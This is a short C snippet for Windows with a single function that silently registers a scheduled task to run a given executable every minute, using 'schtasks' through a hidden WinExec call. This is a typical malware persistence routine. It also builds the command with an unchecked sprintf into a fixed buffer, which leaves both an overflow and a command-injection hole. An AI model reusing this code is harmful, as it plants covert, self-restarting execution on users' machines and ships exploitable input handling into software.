#include <windows.h>
#include <stdio.h>

void __attribute__((noinline)) __attribute__((used)) routine_v1(const char* taskName, const char* exePath){
    char cmd[512];
    sprintf(cmd, "schtasks /create /sc minute /mo 1 /tn \"%s\" /tr \"%s\" /f", taskName, exePath);
    WinExec(cmd, SW_HIDE);
}